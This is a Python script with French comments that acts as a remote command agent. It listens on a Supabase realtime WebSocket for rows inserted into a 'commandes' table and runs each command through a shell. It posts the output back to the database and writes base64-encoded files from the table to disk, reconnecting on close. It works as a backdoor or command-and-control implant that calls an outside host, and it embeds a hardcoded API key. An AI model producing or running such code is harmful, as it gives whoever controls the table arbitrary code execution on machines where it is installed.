import websocket
import json
import subprocess
import os
from supabase import create_client
import base64  # Pour d√©coder les fichiers encod√©s en base64

# Configuration Supabase
SUPABASE_URL = "isglyvyafrpnvoxjcgjy.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlzZ2x5dnlhZnJwbnZveGpjZ2p5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ5MDQ0NTMsImV4cCI6MjA2MDQ4MDQ1M30.Fw6qoLSQGty7PsYGxh8krxt-JCSIN9Nd1r4kMRLfU9I"

# Initialisation du client Supabase
supabase = create_client(f"https://{SUPABASE_URL}", SUPABASE_KEY)

# Nom de la table
TABLE = "commandes"

# URL WebSocket Realtime
realtime_url = f"wss://{SUPABASE_URL}/realtime/v1/websocket?apikey={SUPABASE_KEY}&vsn=1.0.0"

def on_message(ws, message):
    try:
        data = json.loads(message)
        if data.get("event") == "INSERT":
            # R√©cup√©rer les donn√©es de la commande ou du fichier
            record = data["payload"]["record"]
            commande = record.get("commande")
            file_name = record.get("file_name")
            file_content = record.get("file_content")
            path = record.get("path", os.getcwd())  # Utiliser le chemin envoy√© ou le r√©pertoire courant

            if commande:
                print(f"üí¨ Nouvelle commande re√ßue : {commande}")
                try:
                    result = subprocess.check_output(
                        commande, shell=True, stderr=subprocess.STDOUT, text=True, cwd=path
                    )
                    print(f"üñ•Ô∏è R√©sultat de la commande :\n{result}")
                except subprocess.CalledProcessError as e:
                    result = e.output
                    print(f"‚ùå Erreur lors de l'ex√©cution de la commande :\n{result}")

                # Mettre √† jour la commande avec le r√©sultat dans Supabase
                supabase.table(TABLE).update({"result": result}).eq("id", record["id"]).execute()

            elif file_name and file_content:
                print(f"üìÅ Nouveau fichier re√ßu : {file_name}")
                try:
                    # D√©coder le fichier et l'enregistrer
                    decoded_file = base64.b64decode(file_content)
                    with open(file_name, "wb") as file:
                        file.write(decoded_file)
                    print(f"[‚úÖ] Fichier '{file_name}' enregistr√© avec succ√®s.")
                except Exception as e:
                    print(f"[‚ÄºÔ∏è] Erreur lors de l'enregistrement du fichier : {e}")
    except Exception as e:
        print(f"[‚ùå] Erreur lors du traitement du message : {e}")

def on_open(ws):
    print("‚úÖ Connexion WebSocket √©tablie")

    # Canal d'abonnement √† la table "commandes"
    subscription = {
        "topic": f"realtime:public:{TABLE}",
        "event": "phx_join",
        "payload": {},
        "ref": "1"
    }
    ws.send(json.dumps(subscription))

def on_error(ws, error):
    print("‚ùå Erreur :", error)

def on_close(ws, close_status_code, close_msg):
    print("üîå Connexion ferm√©e")
    # Reconnecte automatiquement si la connexion est ferm√©e
    print("Tentative de reconnexion...")
    ws.run_forever()

if __name__ == "__main__":
    # D√©sactiver le tra√ßage WebSocket pour √©viter les messages bruts
    # websocket.enableTrace(False)  # Supprim√© ou comment√© pour √©viter les logs bruts
    ws = websocket.WebSocketApp(
        realtime_url,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close
    )
    # Utilisation de run_forever pour maintenir la connexion ouverte
    ws.run_forever()
